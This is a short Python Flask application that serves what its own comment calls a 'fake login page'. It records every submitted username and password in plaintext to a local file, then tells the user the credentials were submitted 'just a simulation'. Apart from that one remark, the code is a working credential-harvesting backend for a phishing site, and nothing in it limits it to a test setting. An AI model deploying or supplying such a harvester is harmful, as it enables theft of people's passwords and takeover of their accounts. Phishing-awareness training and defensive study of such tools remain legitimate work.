from flask import Flask, render_template, request

app = Flask(__name__)

# Route for the fake login page
@app.route('/')
def login_page():
    return render_template('login.html')

# Handle form submissions
@app.route('/submit', methods=['POST'])
def handle_login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Log the collected data
    with open('collected_data.txt', 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")

    return "Your credentials have been submitted! (This is just a simulation!)"

if __name__ == '__main__':
    app.run(debug=True)
